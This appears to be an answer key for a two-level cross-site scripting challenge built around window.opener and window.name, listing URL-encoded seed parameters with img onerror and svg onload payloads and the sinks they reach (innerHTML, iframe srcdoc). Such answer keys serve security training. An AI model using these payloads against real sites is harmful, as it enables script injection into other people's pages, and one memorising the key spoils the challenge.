# opener — solutions

window.opener-based bootstrap where the first request seeds data read by the popup.

### opener-level1

`/opener/level1/?seed=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: seed written to window.name then popup reads opener.name to innerHTML

### opener-level2

`/opener/level2/?seed=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: seed stored on opener and set as iframe srcdoc in popup
